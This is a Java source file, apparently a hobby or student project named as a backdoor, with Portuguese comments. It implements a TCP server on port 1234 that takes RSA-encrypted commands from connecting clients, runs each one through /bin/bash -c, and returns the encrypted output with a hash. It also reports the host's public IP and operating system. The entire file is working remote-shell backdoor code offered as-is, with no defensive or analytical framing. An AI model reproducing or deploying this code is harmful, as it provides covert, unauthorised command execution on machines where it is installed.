package backdoor.java;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.BufferedReader;
import java.io.Closeable;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.HttpURLConnection;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.logging.Level;
import java.util.logging.Logger;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.EncodedKeySpec;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;

import java.util.Base64;
import java.util.Random;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class Server {
    
    public static void main(String[] args) throws IOException {

        /* resgatar IP publico onde o servidor está sendo iniciado */
        URL urlName = new URL("http://checkip.amazonaws.com");
        HttpURLConnection conection = (HttpURLConnection) urlName.openConnection();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(conection.getInputStream()));
        
        File publicKeyFile = new File("keystore/publicKeyFile.bin");
        File privateKeyFile = new File("keystore/privateKeyFile.bin"); 

        final int PORT = 1234;
        ServerSocket server = new ServerSocket(PORT);
        
        System.out.println(RemoteShell.executeCommand("clear") + "Servidor iniciado: " + bufferedReader.readLine() + ": " + PORT);
        bufferedReader.close();

        while(!server.isClosed()){
            
            try{
        
                /* aceitar conexão do cliente e gerar um prefixo para ele */
                Socket client = server.accept();
                final int PREFIX = new Random().nextInt();
                

                System.out.println("Client: " + PREFIX + " conectado | " + client.getInetAddress().getHostAddress() + "\n");
                ObjectOutputStream outputStream = new ObjectOutputStream(client.getOutputStream());
        
                /* gerar nova thread para o cliente conectado */
                Thread thread = new Thread(() -> {

                    try {
            
                        ObjectInputStream inputStream = new ObjectInputStream(client.getInputStream());
                        
                        while(client.isConnected()){
                            
                            char character = '-';
                            char[] arrayCharacter = new char[80];
                            Arrays.fill(arrayCharacter, character);
                            String spaces = new String(arrayCharacter);
                            
                            /* descriptografar mensagem recebida */
                            String decodedCommand = Cryptography.decryptMesage((String)inputStream.readObject(), privateKeyFile);
                            System.out.println(spaces + "\n\nClient " + PREFIX + ": " + decodedCommand + "\n");
                            
                            /* interpretar comando e executar ele a partir do servidor */
                            String log = RemoteShell.executeCommand(decodedCommand);
                            System.out.println(log);
                            
                            /* criptografar o log do comando executado */
                            String encodedMessage = Cryptography.encryptMessage(log, publicKeyFile);

                            /* gerar uma hash do log */
                            String hashLog = Cryptography.hashMessage(log);
                            System.out.println("Hash: " + hashLog + "\n\n" + spaces);

                            try {
                                if("exit".equals(decodedCommand)) {
            
                                    System.out.println("\nCliente: " + PREFIX + " desconectado!\n");
                                    
                                    inputStream.close();
                                    outputStream.flush();
                                    outputStream.close();
                                    client.close();
                                    
                                    break;
                                }
                                
                                /* enviar o log criptografado e seu hash */
                                outputStream.writeObject(encodedMessage);
                                outputStream.writeObject(hashLog);
                            
                            } catch (Exception exception) {
                                exception.printStackTrace();
                            }
                        
                        }
                    }
                    catch(IllegalBlockSizeException illegalBlockSizeException) {

                        System.out.println(illegalBlockSizeException);
                        try {
                            String returnMessage = "Data must not be longer than 245 bytes";
                            String encodedMessage = Cryptography.encryptMessage(returnMessage, publicKeyFile);
                            outputStream.writeObject(encodedMessage);
                            outputStream.writeObject(Cryptography.hashMessage(returnMessage));
                        }
                        catch (Exception exception) { exception.printStackTrace();}
                    
                    }
                    catch(Exception exception) { exception.printStackTrace(); }

                }, "client");
                thread.start();

                /* enviar mensagem ao cliente quando ele se conectar ao servidor com sucesso */
                String OperatingnSystem = "Linux";
                if(!RemoteShell.executeCommand("ls /").contains("root")){OperatingnSystem = "Windows";};
                
                outputStream.writeObject(Cryptography.encryptMessage(RemoteShell.executeCommand("clear") + 
                "Hello from Server!\nServer is runing in " + OperatingnSystem + " Operating System!\n", publicKeyFile));
                
            } catch (Exception exception){ exception.printStackTrace(); break; }
        }

        server.close();

    }

}

class RemoteShell {

    /* gerar logger */
    private static final Logger log = Logger.getLogger(RemoteShell.class.getName());

    public static String executeCommand(final String command) throws IOException {

        /* montar o comando a partir de umas ArrayList */
        final ArrayList<String> commands = new ArrayList<String>();
        commands.add("/bin/bash");
        commands.add("-c");
        commands.add(command);

        BufferedReader bufferedReader = null;
        String logBuffer = "";

        try {
        
            /* gerar processo de montagem e inicia-lo */
            final ProcessBuilder processBuilder = new ProcessBuilder(commands);
            final Process process = processBuilder.start();
            final InputStream inputStream = process.getInputStream();
            final InputStreamReader inputStreamReader = new InputStreamReader(inputStream);

            bufferedReader = new BufferedReader(inputStreamReader);

            String line;
            while((line = bufferedReader.readLine()) != null) { logBuffer += line + "\n"; }
        
        } catch (IOException ioException){
            
            /* log de rastreio para vericidade do shell */
            if(log.isLoggable(Level.FINEST)){
                log.finest("Erro ao executar o comando shell: " + ioException.getMessage()); 
            }
            ioException.printStackTrace();   
            
        } finally { secureClose(bufferedReader); }
        
        return logBuffer;
    
    }

    private static void secureClose(final Closeable source){
        try{
            if(source != null){
                source.close();
            }
        } catch (IOException ioException){
            ioException.printStackTrace();
        }
    }

}

class Cryptography {
    
    public static void createRSAKeys(File publicKeyFile, File privateKeyFile)
    throws NoSuchAlgorithmException, FileNotFoundException, IOException {

        /* instanciar o algoritimo de chave */
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        KeyPair pair = generator.genKeyPair();

        /* escrever chave publica */
        try(FileOutputStream fileOutputStream = new FileOutputStream(publicKeyFile)){
            fileOutputStream.write(pair.getPublic().getEncoded());
        }
        
        /* escrever chave privada */
        try(FileOutputStream fileOutputStream = new FileOutputStream(privateKeyFile)){
            fileOutputStream.write(pair.getPrivate().getEncoded());
        }

    }

    public static PublicKey readRSAPublicKey(File publicKeyFile) 
    throws IOException, NoSuchAlgorithmException, InvalidKeySpecException {

        /* ler os bytes da chave publica */
        byte[] publicKeyBytes = Files.readAllBytes(publicKeyFile.toPath());

        /* reconhecer o algoritimo RSA */
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");

        /* analisar a chave no padrão de codificação X509 */
        EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyBytes);
        return keyFactory.generatePublic(publicKeySpec);

    }

    public static PrivateKey readRSAPrivateKey(File privateKeyFile)
    throws NoSuchAlgorithmException, IOException, InvalidKeySpecException {

        /* ler os bytes da chave privada */
        byte[] privateKeyBytes = Files.readAllBytes(privateKeyFile.toPath());

        /* reconhecer o algoritimo RSA */
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");

        /* analisar a chave no padrão de codificação PKCS8 */
        EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(privateKeyBytes);
        return keyFactory.generatePrivate(privateKeySpec);

    }

    public static String encryptMessage(String message, File publicKeyFile) 
    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {

        /* encriptar a mensagem passada a partir do algoritimo RSA */
        Cipher encryptCipher = Cipher.getInstance("RSA");

        /* analizar a chave publica */
        encryptCipher.init(Cipher.ENCRYPT_MODE, readRSAPublicKey(publicKeyFile));
        
        /* gerar os bytes da mensagemm com o padrão UTF-8 para não zuar a acentuação */
        byte[] messageBytes = message.getBytes(StandardCharsets.UTF_8);
        byte[] encryptMessageBytes = encryptCipher.doFinal(messageBytes);

        /* retornar a encriptografia da mensagem */
        return Base64.getEncoder().encodeToString(encryptMessageBytes);

    }


    public static String decryptMesage(String encryptMessage, File privateKeyFile)
    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {

        /* espicificar o algoritimo para descriptografia */
        Cipher decryptCipher = Cipher.getInstance("RSA");

        /* ler a chave privada */
        decryptCipher.init(Cipher.DECRYPT_MODE, readRSAPrivateKey(privateKeyFile));

        /* realizar o decode da mensagem em bytes */
        byte[] decryptMessageBytes = decryptCipher.doFinal(Base64.getDecoder().decode(encryptMessage));
        return new String(decryptMessageBytes, StandardCharsets.UTF_8);

    }

    public static String hashMessage(String message) throws NoSuchAlgorithmException{
        
        /* instanciar algoritimo de hash SHA3-256 */
        final MessageDigest digest = MessageDigest.getInstance("SHA3-256");

        /* gerar a hash de acordo com o padrão UTF-8 para não haver perdas durante o processo */
        final byte[] hashBytes = digest.digest(message.getBytes(StandardCharsets.UTF_8));
        
        /* retornar a hash em hexadecimal */
        return bytesToHex(hashBytes);
    
    }

    private static String bytesToHex(byte[] hash){

        /* instanciar montagem da string hexadecimal a partir do array de bytes */
        StringBuilder hexString = new StringBuilder(2 * hash.length);

        /* montar a string hexadecimal em cima de cada byte da hash */
        for (byte b : hash){
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) { hexString.append('0'); }
            hexString.append(hex);
        }

        return hexString.toString();

    }

}
